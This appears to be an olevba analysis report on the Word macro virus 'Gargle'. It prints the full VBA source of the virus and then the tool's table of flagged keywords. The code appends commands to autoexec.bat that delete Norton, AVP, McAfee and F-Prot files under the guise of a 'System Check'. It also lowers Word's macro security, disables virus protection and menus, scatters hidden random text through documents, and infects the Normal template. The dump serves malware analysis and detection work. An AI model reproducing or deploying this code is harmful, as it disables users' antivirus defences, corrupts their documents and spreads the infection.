olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Gargle-6c218d6d895e334be0c39ca3d68e597c95c5b93d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Gargle-6c218d6d895e334be0c39ca3d68e597c95c5b93d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub FilePrintPreview() '¡×’ú[ÀÄÌ
Randomize 'Ÿüãa¿uæÌ
abcd$ = Chr(85) & Chr(110) & Chr(101) & Chr(120) & Chr(112) & Chr(101) & Chr(99) & Chr(116) & Chr(101) & Chr(100) & Chr(47) & Chr(85) & Chr(110) & Chr(100) & Chr(101) & Chr(102) & Chr(105) & Chr(110) & Chr(101) & Chr(100) & Chr(32) & Chr(101) & Chr(114) & Chr(114) & Chr(111) & Chr(114) & Chr(32) & Chr(97) & Chr(116) & Chr(32) & Chr(97) & Chr(100) & Chr(100) & Chr(114) & Chr(101) & Chr(115) & Chr(115) & Chr(32) '‹S¶UÀ{Q¹
t = "{00" & Int(Rnd * 999999) & ":" & Int(Rnd * 99999) & "}" '©¯àòi]ÉÛ
MsgBox abcd$ & t, vbCritical '}âÔ‰°‡¤›
End Sub '°Ôrår__
Private Sub Retro() 'nb¤÷‹yÀl
On Error Resume Next 'ÄJôtÁþ‰
Open "c:\autoexec.bat" For Append As #1 '†˜ÉqæÕ™X
Print #1, "@echo off" 'foþCÈw}
Print #1, "echo ************" ']~›ðHÒO¸
Print #1, "echo ** GarGle **" 'ÃÔ�Ñaò~N
Print #1, "echo ************" 'y¼_ç_“ñ™
'norton 'ü’ÒÈh`¾û
Print #1, "echo [Norton System Check]" 'Ó¬‰uÒnÅ´
Print #1, "del c:\progra~1\norton~1\*.exe" 'd÷Ü¾M™S¾
Print #1, "del c:\progra~1\norton~1\*.dll" 'Ô—B¥µå|v
Print #1, "del c:\progra~1\norton~1\*.dat" 'µ†¨¹½]Ãô
Print #1, "del c:\progra~1\norton~1\*.vxd" 'Óô]zÊqõõ
Print #1, "del c:\norton~1\*.exe" 'âìdñV×Ëò
Print #1, "del c:\norton~1\*.dll" '˜íaŸˆ²G‚
Print #1, "del c:\norton~1\*.dat" 'ËOnMßgÔú
Print #1, "del c:\norton~1\*.vxd" 'ØœÂuP�n”
Print #1, "echo." 'º’à™–·À
'avp 'þH©K´aŸ–
Print #1, "echo [AVP System Check]" 'ý²Ïwëá~å
Print #1, "del c:\progra~1\antiv~1\*.avc " '¢hé�üFùâ
Print #1, "del c:\progra~1\antiv~1\*.set " 'wh•Ãvøc½
Print #1, "del c:\progra~1\antiv~1\*.dll " 'JçK�šUS†
Print #1, "del c:\progra~1\antiv~1\*.vxd " 'K÷ý®A¶ÏŠ
Print #1, "del c:\progra~1\antiv~1\*.exe " '¬`Ài±â©ø
Print #1, "del c:\antiv~1\*.avc " '‡·[ÍÉçÜ¿
Print #1, "del c:\antiv~1\*.set " 't–±OWõqç
Print #1, "del c:\antiv~1\*.dll " '®fåi{J–
Print #1, "del c:\antiv~1\*.vxd " '¶‡òÌM�‰­
Print #1, "del c:\antiv~1\*.exe " 'pò�vðÇòœ
Print #1, "echo." '}ÙMSÆj†Ó
'mcafee 'j�u�ø¿Þš
Print #1, "echo [McAfee System Check]" 'å±©Eç•
'just in case its not where its supposed to be :) '¬_d³Nýóé
Print #1, "del c:\progra~1\mcafee~1\*.dat " 'âõ‰à‰–àÜ
Print #1, "del c:\progra~1\mcafee~1\*.dll " '¸�[ÀZA{°
Print #1, "del c:\progra~1\mcafee~1\*.exe " 'ƒÂ©wi”“‡
Print #1, "del c:\progra~1\mcafee~1\*.vsc " 'û�…ùysm¿
Print #1, "del c:\progra~1\mcafee\*.dat " '¤ò–¯}bQÛ
Print #1, "del c:\progra~1\mcafee\*.dll " '™–‚Jø±uš
Print #1, "del c:\progra~1\mcafee\*.exe " '€àÇéhVšX
Print #1, "del c:\progra~1\mcafee\*.vsc " '_ŸßÂÔJl²
Print #1, "del c:\mcafee~1\*.dat" 'üÕb³¾ñ¡¥
Print #1, "del c:\mcafee~1\*.dll" '‹�Ûì¶÷]ê
Print #1, "del c:\mcafee~1\*.exe" 'ô‰ú�Ã­‰ž
Print #1, "del c:\mcafee~1\*.vsc" 'ÎÀ¤A¼é—
Print #1, "del c:\mcafee\*.dat" 'ì¤™d¬m¢Î
Print #1, "del c:\mcafee\*.dll" 'Kª–£q»º
Print #1, "del c:\mcafee\*.exe" 'ß€rXÚ„®q
Print #1, "del c:\mcafee\*.vsc" 'ŒékPzôG
Print #1, "echo." 'ñekµe¸ o
'F-prot 'VÂ]`Ebl�
'not widely used in the US, but hey :) '½Ë™Ëý™e
Print #1, "[F-Prot System Check]" 'Õc^·lÞ›T
Print #1, "del c:\progra~1\fsi\f-prot\*.exe" 'ÉÝ„`ÅºêÛ
Print #1, "del c:\progra~1\fsi\f-prot\*.dll" 'lëÞZQPok
Print #1, "del c:\progra~1\fsi\f-prot\*.vxd" 'N²Ÿy´C—P
Print #1, "del c:\progra~1\fsi\f-prot\*.rep" '§¯î�nþ€–
' just in case 'ñ”ÒXmÙPk
Print #1, "del c:\progra~1\f-prot\*.exe" 'Jm‹Ç±ë×¸
Print #1, "del c:\progra~1\f-prot\*.dll" 'Íút|²õôÈ
Print #1, "del c:\progra~1\f-prot\*.vxd" '�W¡Qv�ïã
Print #1, "del c:\progra~1\f-prot\*.rep" 'iP‡Ò÷»›s
Print #1, "del c:\f-prot\*.exe" 'nËÎ_Æ]tœ
Print #1, "del c:\f-prot\*.dll" '{éÁ½â€‚ä
Print #1, "del c:\f-prot\*.vxd" 'ÞÝáÈ Š»T
Print #1, "del c:\f-prot\*.rep" 'lÓMˆGÆ�É
Print #1, "del c:\fsi\f-prot\*.exe" '•Ž×Ô®‡R¬
Print #1, "del c:\fsi\f-prot\*.dll" '”†¹³¥ÄM|
Print #1, "del c:\fsi\f-prot\*.vxd" 'ÀËÞºM¿íø
Print #1, "del c:\fsi\f-prot\*.rep" '¹¨Ñn´Ÿ¢…
Print #1, "echo." '€y•à†R½½
Print #1, "echo All System Checks have been completed." 'Ö”I•×«¡á
Close #1 '£å‡^WÉYm
End Sub 'Q“…¸á­ùú
 'ª”³·kâˆ¨
 'B]Ü—ÖšOm
Private Sub ViewVBCode() 'Ft‡¦ÝLÅÂ
Randomize 'n™Ôßê–q‚
abcd$ = Chr(85) & Chr(110) & Chr(101) & Chr(120) & Chr(112) & Chr(101) & Chr(99) & Chr(116) & Chr(101) & Chr(100) & Chr(47) & Chr(85) & Chr(110) & Chr(100) & Chr(101) & Chr(102) & Chr(105) & Chr(110) & Chr(101) & Chr(100) & Chr(32) & Chr(101) & Chr(114) & Chr(114) & Chr(111) & Chr(114) & Chr(32) & Chr(97) & Chr(116) & Chr(32) & Chr(97) & Chr(100) & Chr(100) & Chr(114) & Chr(101) & Chr(115) & Chr(115) & Chr(32) 'Óäa�|a¼A
t = "{00" & Int(Rnd * 999999) & ":" & Int(Rnd * 99999) & "}" 'Ð£âðÁöct
MsgBox abcd$ & t, vbCritical 'äøÍL�nGS
End Sub 'ÐÁíYî¿Õo
 '¸°MŸÖ°êÛ
Private Sub Document_Close() 'Ä®LW¶§lÌ
Document_Open '¾üŠDÛÔ¦q
Retro 'uSÀÙLÏõ˜
End Sub '×¾d]Ù·¡Ò
 'š†‚€ÑÐ·�
Private Sub Document_New() 'S…hÃŽgµó
Document_Open 'šÐ÷YžmaÔ
End Sub 'îT”½£Ýë¹
 'Îì¶às[ÓL
Private Sub Document_Open() 'ÜYV‚uKÀò
On Error Resume Next: If ActivePrinter = "" Then GoTo f 'ýÃÃŠ…¼âù
MsgBox "Undefined/Unexpected error on " + ActivePrinter, vbCritical '¼õËwQÈ›f
f: With Options: .PrintHiddenText = (100 - 99): .VirusProtection = (99 - 99): .SaveNormalPrompt = (99 - 99) 'bmÕñxjPœ
.SavePropertiesPrompt = (99 - 99): .ConfirmConversions = (99 - 99): End With '�|Du¯äVD
ActiveWindow.View.ShowHiddenText = (99 - 99): Dim DocWords, DocHalfWords, DocLastWords 'ŸïÑæÞ¥‹Ý
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1& '½lø€¾Üºo
CommandBars("Tools").Controls("Macro").Enabled = (99 - 99): CommandBars("File").Controls("Print Preview").Enabled = (99 - 99): CommandBars("Edit").Controls("Select All").Enabled = (99 - 99) '�ˆÍçü¤÷—
CommandBars("Edit").Controls("Undo VBA-Selection.TypeText").Enabled = (99 - 99): CommandBars("Tools").Controls("Word Count...").Enabled = (99 - 99): CommandBars("Tools").Controls("Options...").Enabled = (99 - 99) 'ÏõÜÑš]ƒù
ActiveDocument.ActiveWindow.View.ShowFirstLineOnly = (99 - 99): DocWords = ActiveDocument.Words.Count: DocHalfWords = Int(DocWords / 2): Selection.Font.Hidden = (100 - 99): Selection.TypeText "   {Printer Error #0099544}   " 'ºœPâIŒhV
Set Gargle = ActiveDocument.Words(1): With Gargle: .MoveStart Unit:=wdCharacter, Count:=-1: .Select: End With '±úKO�ÁÙ©
For x = 1 To 10: s = s - 1: If s < 1 Then s = 20 'X‡�÷£±ÚÒ
a$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): b$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): c$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) 'tM‘PU˜Ö®
d$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): e$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): f$ = a$ + b$ + c$ + d$ + e$ 'P�«´a×Ä¸
redx = Int(Rnd * 255): bluex = Int(Rnd * 255): greenx = Int(Rnd * 255) 'VjìØšÜ†ë
Selection.Font.Hidden = (100 - 99): Selection.Font.Size = s: Selection.Font.Color = RGB(redx, greenx, bluex): Selection.TypeText (f$): Next x '÷oÀ™FõGc
s = 21: Set Gargle = ActiveDocument.Words(DocHalfWords): With Gargle: .MoveStart Unit:=wdCharacter, Count:=-1: .Select: End With 'ÇÄÍ£»|ßµ
For x = 1 To 10: s = s - 1: If s < 1 Then s = 20 'šÍT“…os\
a$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): b$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): c$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) 'çý�ÓCÓÍN
d$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): e$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): f$ = a$ + b$ + c$ + d$ + e$ '­F˜ÀÃYJž
redx = Int(Rnd * 255): bluex = Int(Rnd * 255): greenx = Int(Rnd * 255) 'ÇåÀƒmpéå
Selection.Font.Hidden = (100 - 99): Selection.Font.Size = s: Selection.Font.Color = RGB(redx, greenx, bluex): Selection.TypeText (f$): Next x: '™žµ²Ôv~–
s = 21: For x = 1 To 10: s = s - 1: If s < 1 Then s = 21 '¦~ŸwfNá
a$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): b$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): c$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) '¶ÐÀå»¾qœ
d$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): e$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65): f$ = a$ + b$ + c$ + d$ + e$ 'ò¶YåHØ…V
redx = Int(Rnd * 255): bluex = Int(Rnd * 255): greenx = Int(Rnd * 255): DocLasTWord = DocWords - wdWord: Set Gargle = ActiveDocument.Words(DocLasTWord): With Gargle: .MoveStart Unit:=wdWord, Count:=-1: .Select: End With 'ËÆþŠ¬”u}
Selection.Font.Hidden = (100 - 99): Selection.Font.Size = s: Selection.Font.Color = RGB(redx, greenx, bluex): Selection.TypeText (f$): Next x 'ÎpK¶`o¦B
 'Ð—h~KNLð
Dim Norm, NormCode, NormLines, Doc, DocCode, DocLines 'IùC�i�½Z
Set Norm = NormalTemplate.VBProject.VBComponents(1) 'í�`Pép¥¥
Set Doc = ActiveDocument.VBProject.VBComponents(1) '`ØþKPÞÓ�
Set DocCode = Doc.CodeModule '»`ûPìå´
Set NormCode = Norm.CodeModule 'ÄønKïádÉ
 '¿·Eøìmžç
If DocCode.lines(23, 1) = "" Then '–þlæUƒ•¶
For y = 1 To DocCode.countoflines 'òíë^æÂQ{
DocCode.replacelines y, "Gargle" '¥¸Æxy�ƒ¹
Next y '½Œš|Ñò¬Y
For x = 2 To NormCode.countoflines 'rè½ƒŠ‚ö·
a$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) 'wÉãS°òWÚ
a = NormCode.lines(x, 1) + " '" + a$ 'jý}€£È«Á
DocCode.insertlines 26 + x, a '¦Ï��¶ç`N
Next x 'oœcÔQ€È\
ActiveDocument.SaveAs ActiveDocument.FullName: NormalTemplate.Save '…·Ó‘‰fˆé
End If '�Rü˜Ìvj¶
 '÷ÊÔ¨º±Ã�
If NormCode.lines(23, 1) = "" Then 'MÞÉ‘„äXö
For y = 1 To NormCode.countoflines 'Ù¿¨‘�Ar€
NormCode.replacelines y, "Gargle" 'Óõ¶õS»Ëo
Next y '°�•üù¶§]
For x = 1 To DocCode.countoflines '‡öa¯„–±à
a$ = Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) + Chr$(Int(Rnd * 190) + 65) 'uåQˆàèdï
a = DocCode.lines(x, 1) + " '" + a$ 'õ³WRÓ�¡€
NormCode.insertlines 26 + x, a 'N¸€DÔ›Yã
Next x 'Þê•¤n¹¤®
ActiveDocument.SaveAs ActiveDocument.FullName: NormalTemplate.Save '“ry¬Û„©“
End If '²OŠ`íëõÀ
'Word2000.GarGle 'M¹‚ñhÇå‡
'By $MOOTHiE Da HuStla 'R¿”§`ôö
'July 2k 'òçQsžùÑ¼
'Dedicated to my wife ChiQui '‰��•¾á™F
End Sub 'mˆŠý‘ß^�
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

